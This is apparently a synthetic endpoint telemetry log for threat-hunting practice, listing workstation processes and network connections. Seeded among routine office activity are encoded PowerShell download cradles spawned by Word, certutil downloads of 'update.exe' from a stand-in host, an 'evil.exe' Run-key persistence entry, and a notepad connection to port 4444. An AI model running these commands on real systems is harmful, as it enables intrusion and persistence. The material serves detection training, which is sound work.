+2026-04-01 21:07:00,sales-lt-01,bob,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 21:08:00,eng-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 21:09:00,hr-ws-01,charlie,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 21:10:00,fin-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 21:11:00,shared-jump-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 21:12:00,fin-ws-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 21:13:00,fin-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 21:14:00,shared-jump-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",142.250.183.14,443,outlook
+2026-04-01 21:15:00,ops-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 21:16:00,eng-ws-02,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 21:17:00,eng-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 21:18:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 21:19:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.2.20,445,none
+2026-04-01 21:20:00,sales-lt-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 21:21:00,shared-jump-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 21:22:00,ops-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 21:23:00,ops-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 21:24:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 21:25:00,hr-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 21:26:00,sales-lt-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 21:27:00,ops-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 21:28:00,eng-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 21:29:00,hr-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 21:30:00,sales-lt-02,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.1.15,445,none
+2026-04-01 21:31:00,sales-lt-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 21:32:00,hr-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 21:33:00,eng-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 21:34:00,sales-lt-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 21:35:00,hr-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 21:36:00,fin-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 21:37:00,sales-lt-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.1.5.12,445,none
+2026-04-01 21:38:00,fin-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
+2026-04-01 21:39:00,eng-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",142.250.183.14,443,outlook
+2026-04-01 21:40:00,hr-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
+2026-04-01 21:41:00,shared-jump-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 21:42:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-01 21:43:00,fin-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 21:44:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 21:45:00,eng-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 21:46:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 21:47:00,fin-ws-01,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 21:48:00,fin-ws-02,farah,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 21:49:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 21:50:00,sales-lt-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 21:51:00,eng-ws-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 21:52:00,hr-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 21:53:00,eng-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 21:54:00,shared-jump-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 21:55:00,sales-lt-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
+2026-04-01 21:56:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
+2026-04-01 21:56:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-01 21:57:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 21:57:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-01 21:58:00,fin-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",8.8.8.8,443,outlook
+2026-04-01 21:58:00,eng-ws-02,charlie,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
+2026-04-01 21:59:00,ops-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
+2026-04-01 22:00:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 22:01:00,fin-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 22:02:00,fin-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 22:03:00,sales-lt-02,george,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 22:04:00,sales-lt-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 22:05:00,sales-lt-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 22:06:00,eng-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 22:07:00,ops-ws-02,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 22:08:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",172.16.10.8,445,none
+2026-04-01 22:09:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 22:10:00,fin-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 22:11:00,shared-jump-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 22:12:00,sales-lt-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
+2026-04-01 22:13:00,eng-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
+2026-04-01 22:14:00,sales-lt-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 22:15:00,eng-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
+2026-04-01 22:16:00,shared-jump-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 22:17:00,fin-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 22:18:00,ops-ws-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 22:19:00,hr-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 22:20:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 22:21:00,fin-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 22:22:00,fin-ws-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 22:23:00,fin-ws-01,diana,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 22:24:00,eng-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 22:25:00,eng-ws-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 22:26:00,sales-lt-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 22:27:00,eng-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 22:28:00,ops-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 22:29:00,ops-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 22:30:00,fin-ws-01,ethan,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 22:31:00,fin-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 22:32:00,hr-ws-01,helen,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
+2026-04-01 22:33:00,sales-lt-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 22:34:00,fin-ws-01,george,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 22:35:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
+2026-04-01 22:36:00,ops-ws-02,farah,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 22:37:00,sales-lt-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 22:38:00,ops-ws-01,george,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 22:39:00,eng-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 22:40:00,eng-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-01 22:41:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 22:41:00,eng-ws-02,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 22:42:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 22:42:00,eng-ws-02,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,10.0.0.5,0,none
+2026-04-01 22:43:00,hr-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
+2026-04-01 22:43:00,eng-ws-02,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
+2026-04-01 22:44:00,fin-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",172.16.10.8,445,none
+2026-04-01 22:45:00,ops-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 22:46:00,ops-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 22:47:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
+2026-04-01 22:48:00,shared-jump-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.1.12,445,none
+2026-04-01 22:49:00,sales-lt-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-01 22:50:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 22:51:00,eng-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 22:52:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 22:53:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.4.25,445,none
+2026-04-01 22:54:00,eng-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 22:55:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 22:56:00,ops-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 22:57:00,ops-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 22:58:00,sales-lt-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 22:59:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 23:00:00,ops-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 23:01:00,fin-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 23:02:00,shared-jump-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.0.5,445,none
+2026-04-01 23:03:00,fin-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",45.33.32.156,443,outlook
+2026-04-01 23:04:00,shared-jump-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
+2026-04-01 23:05:00,ops-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 23:06:00,ops-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 23:07:00,ops-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 23:08:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
+2026-04-01 23:09:00,eng-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 23:10:00,ops-ws-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 23:11:00,ops-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 23:12:00,eng-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.2.20,445,none
+2026-04-01 23:13:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 23:14:00,eng-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 23:14:00,fin-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 23:15:00,eng-ws-02,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 23:15:00,fin-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 23:16:00,eng-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 23:17:00,shared-jump-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 23:18:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 23:19:00,fin-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 23:20:00,fin-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 23:21:00,sales-lt-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 23:22:00,hr-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 23:23:00,shared-jump-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
+2026-04-01 23:24:00,eng-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 23:25:00,hr-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
+2026-04-01 23:26:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 23:27:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 23:28:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 23:29:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 23:30:00,ops-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",142.250.183.14,443,outlook
+2026-04-01 23:31:00,ops-ws-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 23:32:00,hr-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 23:33:00,fin-ws-02,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 23:34:00,fin-ws-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 23:35:00,ops-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 23:36:00,eng-ws-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 23:37:00,sales-lt-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 23:38:00,sales-lt-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 23:39:00,eng-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 23:40:00,shared-jump-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 23:41:00,fin-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 23:42:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-01 23:43:00,ops-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 23:44:00,shared-jump-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
+2026-04-01 23:45:00,eng-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 23:46:00,sales-lt-02,farah,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 23:47:00,sales-lt-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",192.168.10.9,445,none
+2026-04-01 23:48:00,ops-ws-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 23:49:00,fin-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 23:50:00,eng-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.0.10,445,none
+2026-04-01 23:51:00,hr-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",142.250.183.14,443,outlook
+2026-04-01 23:52:00,hr-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 23:53:00,shared-jump-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 23:54:00,fin-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 23:55:00,shared-jump-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 23:56:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",45.33.32.156,443,outlook
+2026-04-01 23:57:00,eng-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
+2026-04-01 23:58:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
+2026-04-01 23:59:00,hr-ws-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-02 00:00:00,fin-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-02 00:01:00,ops-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-02 00:01:00,shared-jump-01,ethan,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 00:02:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-02 00:02:00,shared-jump-01,ethan,evil.exe,explorer.exe,C:\Users\ethan\AppData\Local\Temp\evil.exe,10.0.0.10,0,none
+2026-04-02 00:03:00,fin-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-02 00:03:00,shared-jump-01,ethan,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
+2026-04-02 00:04:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-02 00:05:00,eng-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-02 00:06:00,ops-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.10.9,445,none
+2026-04-02 00:07:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-02 00:08:00,eng-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-02 00:09:00,ops-ws-01,diana,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
+2026-04-02 00:10:00,sales-lt-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
+2026-04-02 00:11:00,eng-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",151.101.1.69,443,outlook
+2026-04-02 00:12:00,shared-jump-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-02 00:13:00,sales-lt-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",23.45.67.89,443,outlook
+2026-04-02 00:14:00,hr-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-02 00:15:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-02 00:16:00,fin-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-02 00:17:00,sales-lt-02,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.5,445,none
+2026-04-02 00:18:00,sales-lt-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-02 00:19:00,shared-jump-01,alice,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-02 00:20:00,shared-jump-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-02 00:21:00,ops-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",151.101.1.69,443,outlook
+2026-04-02 00:22:00,hr-ws-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-02 00:23:00,sales-lt-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
